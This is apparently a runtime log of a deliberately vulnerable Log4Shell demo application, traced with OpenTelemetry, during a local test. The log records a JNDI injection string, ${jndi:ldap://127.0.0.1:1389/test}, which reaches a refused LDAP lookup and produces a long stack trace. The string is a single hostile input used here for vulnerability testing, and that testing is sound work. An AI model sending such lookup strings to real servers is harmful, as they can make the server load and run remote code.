OpenJDK 64-Bit Server VM warning: Sharing is only supported for boot loader classes because bootstrap classpath has been appended
[otel.javaagent 2026-06-26 18:57:58:625 +0100] [main] INFO io.opentelemetry.javaagent.tooling.VersionLogger - opentelemetry-javaagent - version: 1.32.0

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::               (v2.7.18)

2026-06-26 18:58:01.981  INFO 23744 --- [           main] f.c.l.v.VulnerableAppApplication         : Starting VulnerableAppApplication using Java 21.0.10 on Ada with PID 23744 (C:\project\vuln_risk_assessor\demo-projects\log4shell-vulnerable-app\build\libs\log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar started by softw in C:\project\vuln_risk_assessor)
2026-06-26 18:58:01.988  INFO 23744 --- [           main] f.c.l.v.VulnerableAppApplication         : No active profile set, falling back to 1 default profile: "default"
2026-06-26 18:58:03.093  INFO 23744 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2026-06-26 18:58:03.162  INFO 23744 --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2026-06-26 18:58:03.162  INFO 23744 --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.83]
2026-06-26 18:58:03.251  INFO 23744 --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2026-06-26 18:58:03.251  INFO 23744 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1227 ms
2026-06-26 18:58:03.718  INFO 23744 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2026-06-26 18:58:03.731  INFO 23744 --- [           main] f.c.l.v.VulnerableAppApplication         : Started VulnerableAppApplication in 2.364 seconds (JVM running for 5.28)
2026-06-26 18:59:29.853  INFO 23744 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2026-06-26 18:59:29.854  INFO 23744 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2026-06-26 18:59:29.855  INFO 23744 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
2026-06-26 18:59:29,913 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1:1389/test]. javax.naming.CommunicationException: 127.0.0.1:1389 [Root exception is java.net.ConnectException: Connection refused: connect]
	at java.naming/com.sun.jndi.ldap.Connection.<init>(Connection.java:251)
	at java.naming/com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:141)
	at java.naming/com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1620)
	at java.naming/com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2848)
	at java.naming/com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:349)
	at java.naming/com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
	at java.naming/com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
	at java.naming/com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:217)
	at java.naming/com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at java.naming/javax.naming.InitialContext.lookup(InitialContext.java:409)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)
	at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
	at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
	at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344)
	at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
	at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540)
	at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456)
	at org.apache.logging.log4j.core.config.AwaitCompletionReliabilityStrategy.log(AwaitCompletionReliabilityStrategy.java:82)
	at org.apache.logging.log4j.core.Logger.log(Logger.java:161)
	at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017)
	at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)
	at org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1320)
	at fr.christophetd.log4shell.vulnerableapp.MainController.index(MainController.java:18)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150)
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117)
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895)
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808)
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1072)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:965)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006)
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:529)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:209)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
	at org.springframework.web.servlet.v3_1.OpenTelemetryHandlerMappingFilter.doFilter(OpenTelemetryHandlerMappingFilter.java:83)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:481)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:390)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:928)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1794)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:1583)
Caused by: java.net.ConnectException: Connection refused: connect
	at java.base/sun.nio.ch.Net.connect0(Native Method)
	at java.base/sun.nio.ch.Net.connect(Net.java:601)
	at java.base/sun.nio.ch.Net.connect(Net.java:590)
	at java.base/sun.nio.ch.NioSocketImpl.connect(NioSocketImpl.java:583)
	at java.base/java.net.SocksSocketImpl.connect(SocksSocketImpl.java:327)
	at java.base/java.net.Socket.connect(Socket.java:751)
	at java.base/java.net.Socket.connect(Socket.java:686)
	at java.base/java.net.Socket.<init>(Socket.java:555)
	at java.base/java.net.Socket.<init>(Socket.java:324)
	at java.base/javax.net.DefaultSocketFactory.createSocket(SocketFactory.java:267)
	at java.naming/com.sun.jndi.ldap.Connection.createConnectionSocket(Connection.java:350)
	at java.naming/com.sun.jndi.ldap.Connection.createSocket(Connection.java:283)
	at java.naming/com.sun.jndi.ldap.Connection.<init>(Connection.java:230)
	... 93 more

[otel.javaagent 2026-06-26 18:59:29:918 +0100] [http-nio-8080-exec-1] INFO io.opentelemetry.exporter.logging.LoggingSpanExporter - 'JndiLookup.lookup' : 886b2ee94679ffb42c67af8a5f16e198 036ef6e3e35add1b INTERNAL [tracer: io.opentelemetry.methods:1.32.0-alpha] AttributesMap{data={code.function=lookup, thread.id=54, code.namespace=org.apache.logging.log4j.core.lookup.JndiLookup, thread.name=http-nio-8080-exec-1}, capacity=128, totalAddedValues=4}
2026-06-26 18:59:29.891  INFO 23744 --- [nio-8080-exec-1] HelloWorld                               : Received a request for API version ${jndi:ldap://127.0.0.1:1389/test}
[otel.javaagent 2026-06-26 18:59:29:931 +0100] [http-nio-8080-exec-1] INFO io.opentelemetry.exporter.logging.LoggingSpanExporter - 'MainController.index' : 886b2ee94679ffb42c67af8a5f16e198 e3327ef8771171d2 INTERNAL [tracer: io.opentelemetry.spring-webmvc-3.1:1.32.0-alpha] AttributesMap{data={thread.id=54, thread.name=http-nio-8080-exec-1}, capacity=128, totalAddedValues=2}
[otel.javaagent 2026-06-26 18:59:29:932 +0100] [http-nio-8080-exec-1] INFO io.opentelemetry.exporter.logging.LoggingSpanExporter - 'GET /' : 886b2ee94679ffb42c67af8a5f16e198 97c593dce1014dc0 SERVER [tracer: io.opentelemetry.tomcat-7.0:1.32.0-alpha] AttributesMap{data={net.sock.host.addr=0:0:0:0:0:0:0:1, http.route=/, net.sock.host.port=8080, thread.id=54, net.sock.peer.port=27976, http.method=GET, http.scheme=http, http.status_code=200, net.protocol.version=1.1, net.host.port=8080, net.protocol.name=http, http.response_content_length=13, http.target=/, net.sock.peer.addr=0:0:0:0:0:0:0:1, net.host.name=localhost, user_agent.original=Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.26100.6899, thread.name=http-nio-8080-exec-1}, capacity=128, totalAddedValues=17}
